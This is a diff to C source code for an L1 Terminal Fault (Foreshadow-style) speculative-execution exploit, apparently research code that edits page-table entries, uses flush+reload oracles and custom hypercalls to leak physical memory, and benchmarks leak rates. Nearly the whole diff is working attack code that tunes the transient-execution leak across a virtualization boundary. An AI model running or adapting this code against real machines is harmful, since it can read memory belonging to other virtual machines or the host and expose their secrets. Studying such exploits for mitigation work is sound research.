@@ -32,6 +32,9 @@
 
 #define THRESHOLD 150
 
+#define TLB_EVSIZE 10000
+char *tlb_evbuf;
+
 uint8_t l1tf_full(void *leak_addr, reload_buffer_t reload_buffer) {
   ssize_t high, low;
 
@@ -109,6 +112,11 @@ void l1tf_leak_buffer_modify(leak_addr_t *leak, void *ptr) {
   size_t pfn = (((uintptr_t)ptr) & ~(0xfff)) >> 0xc;
   size_t current_pte = *(leak->pte_ptr);
   *(leak->pte_ptr) = ptedit_set_pfn(current_pte, pfn);
+  lfence();
+  mfence();
+  clflush(leak->pte_ptr);
+  lfence();
+  mfence();
 }
 
 void l1tf_leak_buffer_free(leak_addr_t *leak) {
@@ -407,6 +415,13 @@ int l1tf_oracle16_9797_touch(uintptr_t physical_addr, int nr_tries, two_byte_rel
   int hits = 0;
 
   for (int i = 0; i < nr_tries; i++) {
+    // for (int i = 0; i < TLB_EVSIZE*PAGE_SIZE; i += PAGE_SIZE)
+    //   *(volatile char *)(tlb_evbuf + i + 0x600);
+    // for (int r = 0; r < 5; r++) //150
+    //   asm volatile ("xor %%rax, %%rax\ncpuid\n\t" ::: "%rax", "%rbx", "%rcx", "%rdx");
+    // for (volatile int r = 0; r < 100000; r++);
+    // usleep(100);
+    lfence();
     *(volatile char *)touch;
     lfence();
     flush(1, (*reload_buffer)[0x9797]);
@@ -498,12 +513,32 @@ uintptr_t hc_direct_map(void)
 
 long rand64(void)
 {
-  return (rand() << 32) | rand();
+  return ((long)rand() << 32) | rand();
+}
+
+uintptr_t find_page_pa(void *page)
+{
+  uint64_t *p = (uint64_t *)page;
+  uintptr_t pa;
+  do {
+    *p = rand64();
+    printf("randomly dumped %lx\n", *p);
+    pa = hc_find_magic(*p);
+    assert(hc_read_pa(pa) == *p);
+    *p = rand64();
+    printf("randomly dumped %lx\n", *p);
+  } while (hc_read_pa(pa) != *p);
+  return pa;
 }
 
 void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   vmcall4(97, 100, 0, 0, 0);
   vmcall4(97, 102, 0, 0, 0);
+  int fd_halt = open("/proc/hypercall/halt", O_WRONLY);
+  assert(fd_halt > 0);
+
+  // for (int i = 0; i < 1000; i++)
+  //   assert(write(fd_halt, NULL, 0) == 0);
 
   initialize_pteditor_lib();
   two_byte_reload_buffer *reload_buffer = aligned_alloc(PAGE_SIZE, sizeof(two_byte_reload_buffer));
@@ -513,29 +548,16 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
 
   unsigned char *p = l1tf_spawn_leak_page();
   assert(p != MAP_FAILED);
+  uintptr_t own_pa  = find_page_pa(p);
   memset(p, 0x97, PAGE_SIZE);
 
-  *(uint64_t *)(p) = 0x9797979797979999;
-  uintptr_t pa = hc_find_magic(0x9797979797979999);
-  vmcall4(97, 103, pa, 0, 0);
-  *(uint64_t *)(p) = 0x7979000079790000;
-  vmcall4(97, 103, pa, 0, 0);
-
-  uintptr_t base = vmcall4(97, 104, 0, 0, 0);
-    uintptr_t dm = vmcall4(97, 105, 0, 0, 0);
-    base -= dm;
-  printf("base == %lx\n", base);
-  vmcall4(97, 103, base, 0, 0);
-  vmcall4(97, 103, base+8, 0, 0);
-  vmcall4(97, 103, base+16, 0, 0);
-  vmcall4(97, 103, base+24, 0, 0);
-
   printf("mmapped own page `p`; look up its phys addr now and press ENTERRRRR\n");
-  getchar();
+  // getchar();
 
+  tlb_evbuf = mmap(NULL, TLB_EVSIZE*PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE|MAP_POPULATE, -1, 0);
+  memset(tlb_evbuf, 0x79, TLB_EVSIZE*PAGE_SIZE);
 
   printf("Scanning L1d cache for own page\n");
-  uintptr_t own_pa = -1;
   // int found = 0;
   // for (size_t run = 1; run < 100000000LL && !found; ++run) {
   //   if (run % 10000000 == 0) printf("run %ld\n", run);
@@ -558,22 +580,53 @@ void l1tf_find_ffff_values(scan_opts_t scan_opts) {
   //     }
   //   }
   // }
-  own_pa = 0x000000046100b000;
   printf("own_pa = %lx\n", own_pa);
 
-  for (int i = 0; i < 10; i++) {
-    if (i == 7)
-      getchar();
+  // for (int r = 0; r < 3; r++)
+  //   assert(write(fd_halt, NULL, 0) == 0);
 
-    int hot = l1tf_oracle16_9797_touch(own_pa, 200000, reload_buffer, leak, p);
-    clflush(p);
-    int cold = l1tf_oracle16_9797(own_pa, 200000, reload_buffer, leak);
-    printf("hot: %6d, cold: %6d\n", hot, cold);
+  // for (int i = 0; i < 35; i++) {
+  //   uint64_t t_start = clock_read();
 
-    hot = l1tf_oracle16_9797_touch(own_pa+0x800, 200000, reload_buffer, leak, p+0x800);
-    clflush(p+0x800);
-    cold = l1tf_oracle16_9797(own_pa+0x800, 200000, reload_buffer, leak);
-    printf("hot: %6d, cold: %6d\n", hot, cold);
+  //   if (i == 5 || i == 20) {
+  //     // for (int r = 0; r < 1000; r++)
+  //     // asm volatile ("xor %%rax, %%rax\ncpuid\n\t" ::: "%rax", "%rbx", "%rcx", "%rdx");
+  //     // usleep(1000000);
+  //     // sleep(1);
+  //     // getchar();
+  //     // for (int r = 0; r < 150; r++)
+  //     //   assert(write(fd_halt, NULL, 0) == 0);
+  //   }
+
+  //   for (int r = 0; r < 5; r++)
+  //     assert(write(fd_halt, NULL, 0) == 0);
+
+  //   int hot = l1tf_oracle16_9797_touch(own_pa, 10000, reload_buffer, leak, p);
+
+
+  //   printf("[%8.1f hits/sec] ", hot / ((clock_read() - t_start) / 1000000000.0));
+
+  //   clflush(p);
+  //   int cold = 0; // l1tf_oracle16_9797(own_pa, 10000, reload_buffer, leak);
+  //   printf("i = %2d | hot: %6d, cold: %6d\n", i, hot, cold);
+
+  //   // hot = l1tf_oracle16_9797_touch(own_pa+0x777, 10000, reload_buffer, leak, p+0x777);
+  //   // clflush(p+0x777);
+  //   // cold = 0; // l1tf_oracle16_9797(own_pa+0x777, 10000, reload_buffer, leak);
+  //   // printf("hot: %6d, cold: %6d\n", hot, cold);
+  // }
+
+  for (int l1tfs_per_halt = 3000; l1tfs_per_halt < 10000; l1tfs_per_halt += 100) {
+    long hot = 0;
+    uint64_t t_start = clock_read();
+    for (int i = 0; i < 100; i++) {
+      for (int r = 0; r < 2; r++)
+        assert(write(fd_halt, NULL, 0) == 0);
+      hot += l1tf_oracle16_9797_touch(own_pa, l1tfs_per_halt, reload_buffer, leak, p);
+    }
+    double time = (clock_read() - t_start) / 1000000000.0;
+    // printf("[%8.1f hits/sec]  hits = %ld,  time = %.1f sec, l1tfs_per_halt = %d\n", hot / time, hot, time, l1tfs_per_halt);
+    printf("[%6d, %10.1f],\n", l1tfs_per_halt, hot/time);
   }
 
   printf("early exit\n");
